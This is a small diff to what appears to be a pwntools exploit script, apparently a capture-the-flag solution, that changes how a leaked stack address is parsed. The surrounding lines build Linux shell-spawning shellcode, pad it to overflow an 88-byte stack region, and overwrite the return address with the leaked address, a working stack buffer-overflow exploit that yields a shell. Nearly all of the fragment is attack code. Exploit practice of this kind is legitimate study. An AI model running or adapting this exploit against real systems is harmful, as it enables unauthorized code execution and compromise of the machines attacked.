@@ -23,7 +23,7 @@ p = start()
 shellcode = asm(shellcraft.linux.sh())
 
 p.recvuntil(b'listing at ')
-stack_leak = int(p.recv(14).decode(), 16)
+stack_leak = int(p.recvline().strip(b'.\n').decode(), 16)
 p.recvuntil(b'>')
 
 payload = shellcode + b'A' * (80 + 8 - len(shellcode)) + p64(stack_leak)
